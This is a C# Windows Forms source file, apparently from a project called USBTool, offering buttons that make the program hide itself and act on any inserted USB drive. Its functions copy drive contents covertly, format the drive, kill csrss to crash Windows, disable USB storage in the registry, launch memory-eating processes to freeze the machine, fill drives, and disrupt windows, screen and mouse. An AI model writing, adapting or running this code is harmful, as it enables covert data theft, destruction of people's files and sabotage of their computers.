using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Management.Instrumentation;
using System.Speech.Synthesis;
using System.Threading;
using System.Windows.Forms;
using USBTool.Properties;

namespace USBTool
{
    public partial class Form1 : Form
    {

        private static readonly string message = StringByTime(" ", 5000);
        [MTAThread]
        public void WhenArrival(string op)
        {
            Hide();
            while (true)
            {
                try
                {
                    foreach (DriveInfo drive in DriveInfo.GetDrives())
                    {
                        if (drive.DriveType == DriveType.Removable)
                        {
                            switch (op)
                            {
                                case "copy":
                                    CopyDiretory(drive.Name, Folder.SelectedPath);
                                    break;
                                case "format":
                                    ManagementClass disks = new ManagementClass("Win32_Volume");
                                    foreach (ManagementObject disk in disks.GetInstances())
                                    {
                                        if (disk.Properties["Name"].Value.ToString() == drive.Name)
                                        {
                                            object[] methodArgs = { "FAT32", true/*快速格式化*/, 4096/*簇大小*/, ""/*卷标*/, false/*压缩*/ };
                                            disk.InvokeMethod("Format", methodArgs);
                                        }
                                    }
                                    
                                    //FormatEx(drive.Name + "\0", FMIFS_HARDDISK, "FAT32", null , true, 4096 ,(int command, int modifier, IntPtr argument)=>{return true;});
                                    break;
                                case "message":
                                    MessageBox.Show(message, "Error", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
                                    break;
                                case "blue":
                                    foreach (Process process in Process.GetProcessesByName("csrss"))
                                    {
                                        try
                                        {
                                            process.Kill();
                                        }
                                        catch
                                        {
                                            continue;
                                        }
                                    }
                                    break;
                                case "hide":
                                    SetAttributes(drive.Name, FileAttributes.Hidden);
                                    break;
                                case "Encrypted":
                                    SetAttributes(drive.Name, FileAttributes.Encrypted);
                                    break;
                                case "system":
                                    SetAttributes(drive.Name, FileAttributes.System);
                                    break;
                                case "readonly":
                                    SetAttributes(drive.Name, FileAttributes.ReadOnly);
                                    break;
                                case "kasi":
                                    ulong number = new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory / 1024 / 1024 / 1024 / 2;
                                    for (ulong runtime = 0; runtime < number; runtime++)
                                    {
                                        Process.Start(Application.StartupPath + "\\mm.exe");
                                    }
                                    while (Process.GetProcessesByName("mm").Length > 0)
                                    {
                                        var usbdevice = from ud in DriveInfo.GetDrives()
                                                        where ud.DriveType == DriveType.Removable
                                                        select ud;
                                        if (usbdevice.Count() == 0)
                                        {
                                            foreach (Process mm in Process.GetProcessesByName("mm"))
                                            {
                                                try
                                                {
                                                    mm.Kill();
                                                }
                                                catch
                                                {

                                                }

                                            }
                                        }
                                    }
                                    break;
                                case "fill":
                                    FillEachFile(drive.Name);
                                    break;
                                case "normal":
                                    SetAttributes(drive.Name, FileAttributes.Normal);
                                    break;
                                case "media":
                                    var play = new mediashow();
                                    play.Play(((object[])Media.Tag)[2].ToString(), (int)((object[])Media.Tag)[1], (int)((object[])Media.Tag)[0]);
                                    break;
                                case "speech":
                                    Voice.Volume = (int)((object[])朗读文本.Tag)[0];
                                    Voice.Rate = (int)((object[])朗读文本.Tag)[1];
                                    Voice.SelectVoice(((object[])朗读文本.Tag)[2].ToString());
                                    Voice.Speak(((object[])朗读文本.Tag)[3].ToString());
                                    break;
                                case "SwapMouseButton":
                                    if (SwapMouseButton(true))
                                    {
                                        SwapMouseButton(false);
                                    }
                                    break;
                                case "volume":
                                    drive.VolumeLabel = sentence;
                                    break;
                                case "rotate":
                                    switch (SystemInformation.ScreenOrientation)
                                    {
                                        case ScreenOrientation.Angle0:
                                            DEVMODE1.dmDisplayOrientation = 1;
                                            break;
                                        case ScreenOrientation.Angle90:
                                            DEVMODE1.dmDisplayOrientation = 2;
                                            break;
                                        case ScreenOrientation.Angle180:
                                            DEVMODE1.dmDisplayOrientation = 3;
                                            break;
                                        case ScreenOrientation.Angle270:
                                            DEVMODE1.dmDisplayOrientation = 0;
                                            break;
                                    }
                                    int temp = DEVMODE1.dmPelsHeight;
                                    DEVMODE1.dmPelsHeight = DEVMODE1.dmPelsWidth;
                                    DEVMODE1.dmPelsWidth = temp;
                                    ChangeDisplaySettings(ref DEVMODE1, 0);
                                    Thread.Sleep(4000);
                                    break;
                                case "baidu":
                                    Process.Start("https://www.baidu.com/");
                                    break;
                                case "fillup":
                                    try
                                    {
                                        StreamWriter sw = new StreamWriter(drive.Name + "/1");
                                        sw.Write(StringByTime(" ", drive.AvailableFreeSpace));
                                        sw.Close();
                                    }
                                    catch
                                    {
                                    }
                                    break;
                                case "glass":
                                    ForEachWindow(GetDesktopWindow(), "glass");
                                    break;
                                case "close":
                                    ForEachWindow(GetDesktopWindow(), "close");
                                    break;
                                case "mousetrail":
                                    string pvParam = "";
                                    SystemParametersInfo(SPI_SETMOUSETRAILS, 15, ref pvParam, 0);
                                    Thread.Sleep(1000);//不要改最后一个参数,不然无法卡死
                                    break;
                                case "destroy":
                                    ForEachWindow(GetDesktopWindow(), "destroy");
                                    break;
                                case "text":
                                    ForEachWindow(GetDesktopWindow(), "text");
                                    break;
                                case "eject":
                                    uint returnvalue = 0;
                                    IntPtr Handle = CreateFile(@"\\.\" + drive.Name[0] + ":", (GENERIC_READ + GENERIC_WRITE), FILE_SHARE_READ + FILE_SHARE_WRITE, IntPtr.Zero, 3, 0, IntPtr.Zero);
                                    DeviceIoControl(Handle, IOCTL_STORAGE_EJECT_MEDIA, IntPtr.Zero, 0, IntPtr.Zero, 0, ref returnvalue, IntPtr.Zero);
                                    break;
                                // int e = Marshal.GetLastWin32Error();
                                // throw New Win32Exception(e); 判断错误
                                case "flash":
                                    ChangeDisplaySettings(ref DEVMODE1, 0);
                                    break;
                                case "picture":
                                    ForEachWindow(GetDesktopWindow(), "picture");
                                    break;
                                case "random":
                                    DEVMODE1.dmDisplayOrientation = rand.Next(4);
                                    int h = DEVMODE1.dmPelsHeight;
                                    DEVMODE1.dmPelsHeight = DEVMODE1.dmPelsWidth;
                                    DEVMODE1.dmPelsWidth = h;
                                    ChangeDisplaySettings(ref DEVMODE1, 0);
                                    Thread.Sleep(4000);
                                    break;
                                case "beep":
                                    Console.Beep(2500,10000);
                                    break;
                                default:
                                    throw (new ArgumentException("该功能还未开发"));
                            }
                        }
                    }
                }
#pragma warning disable CS0168 // 声明了变量，但从未使用过
                catch (Exception e)
#pragma warning restore CS0168 // 声明了变量，但从未使用过
                {
#if DEBUG
                    Debugger.Break();
#else
					StreamWriter br = new StreamWriter(Application.StartupPath + "/bugreport.log", true);
					br.Write(e.GetType().ToString());
					br.Write(e.Message);
					br.WriteLine(e.StackTrace);
					br.Close();
					Close();
#endif
                }
            }
        }
        public void 一插U盘就复制内容_Click(object sender, EventArgs e)
        {
            if (Folder.ShowDialog() == DialogResult.OK & Folder.SelectedPath.Length > 0)
            {
                WhenArrival("copy");
            }
            else
            {
                MessageBox.Show("未选择路径。");
            }
        }
        public void 一插U盘就格式化_Click(object sender, EventArgs e)
        {
            WhenArrival("format");
        }
        public void 一插U盘就无法打开_Click(object sender, EventArgs e)
        {
            Hide();
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\services\USBSTOR", true);
            while (true)
            {
                key.SetValue("Start", 4);
            }
        }
        public void 一插U盘就疯狂弹窗_Click(object sender, EventArgs e)
        {
            WhenArrival("message");
        }
        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
        }
        public void LinkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/ISDHN/USBTool");
        }
        public void 蓝屏_Click(object sender, EventArgs e)
        {
            WhenArrival("blue");
        }
        public void 隐藏_Click(object sender, EventArgs e)
        {
            WhenArrival("hide");
        }
        public void 加密_Click(object sender, EventArgs e)
        {
            WhenArrival("Encrypted");
        }
        public void 设置为系统_Click(object sender, EventArgs e)
        {
            WhenArrival("system");
        }
        public void 卡机_Click(object sender, EventArgs e)
        {
            foreach (Process mm in Process.GetProcessesByName("mm"))
            {
                mm.Kill();
            }
            var file = File.Create(Application.StartupPath + "\\mm.exe");
            file.Write(Resources.mm, 0, Resources.mm.Length);
            file.Close();
            WhenArrival("kasi");
        }
        public void 设置为只读_Click(object sender, EventArgs e)
        {
            WhenArrival("readonly");
        }
        public void 用空字符填充_Click(object sender, EventArgs e)
        {
            WhenArrival("fill");
        }
        public void 播放视频_Click(object sender, EventArgs e)
        {
            Media.Tag = SetAttrib.Show("media");
            if (((object[])Media.Tag).Length != 0)
            {
                WhenArrival("media");
            }
        }
        public void 朗读文本_Click(object sender, EventArgs e)
        {
            朗读文本.Tag = SetAttrib.Show("speech");
            if (朗读文本.Tag.ToString().Length != 0)
            {
                WhenArrival("speech");
            }
        }
        public void Form1_Load(object sender, EventArgs e)
        {
            if (Environment.OSVersion.Version.Major < 6)
            {
                Glass.Enabled = false;
            }
            try
            {
                SpeechSynthesizer i = new SpeechSynthesizer();
                if (i.GetInstalledVoices().Count == 0)
                {
                    朗读文本.Enabled = false;
                    return;
                }
            }
            catch (Exception)
            {
                朗读文本.Enabled = false;
                return;
            }
            Voice = new SpeechSynthesizer
            {
                Rate = 0,
                Volume = 0
            };
        }
        public void 切换左右键_Click(object sender, EventArgs e)
        {
            WhenArrival("SwapMouseButton");
        }
        public void 修改U盘名称_Click(object sender, EventArgs e)
        {
            string i;
            if ((i = Interaction.InputBox("输入U盘名称。", "输入", "我的U盘")).Length == 0)
            {
                return;
            }
            else
            {
                sentence = i;
            }
            WhenArrival("volume");
        }
        public void 旋转屏幕_Click(object sender, EventArgs e)
        {
            EnumDisplaySettings(null, -1, ref DEVMODE1);
            WhenArrival("rotate");
        }
        public void ShowBaiDu_Click(object sender, EventArgs e)
        {
            WhenArrival("baidu");
        }
        public void FillUp_Click(object sender, EventArgs e)
        {
            WhenArrival("fillup");
        }
        public void Glass_Click(object sender, EventArgs e)
        {
            WhenArrival("glass");
        }
        public void CloseWnd_Click(object sender, EventArgs e)
        {
            WhenArrival("close");
        }
        public void MouseTrail_Click(object sender, EventArgs e)
        {
            WhenArrival("mousetrail");
        }
        public void Destroy_Click(object sender, EventArgs e)
        {
            WhenArrival("destroy");
        }
        public void SetText_Click(object sender, EventArgs e)
        {
            string i;
            if ((i = Interaction.InputBox("输入你喜欢的窗口标题")).Length > 0)
            {
                sentence = i;
                WhenArrival("text");
            }
        }
        public void Eject_Click(object sender, EventArgs e)
        {
            WhenArrival("eject");
        }
        public void flash_Click(object sender, EventArgs e)
        {
            EnumDisplaySettings(null, -1, ref DEVMODE1);
            WhenArrival("flash");
        }

        public void picture_Click(object sender, EventArgs e)
        {
            var temp = SetAttrib.Show("picture");
            if (temp.Length != 0)
            {
                sentence = temp[0].ToString();
                WhenArrival("picture");
            }
        }

        private void random_Click(object sender, EventArgs e)
        {
            EnumDisplaySettings(null, -1, ref DEVMODE1);
            WhenArrival("random");
        }

        private void Beep_Click(object sender, EventArgs e)
        {
            WhenArrival("beep");
        }
    }
}
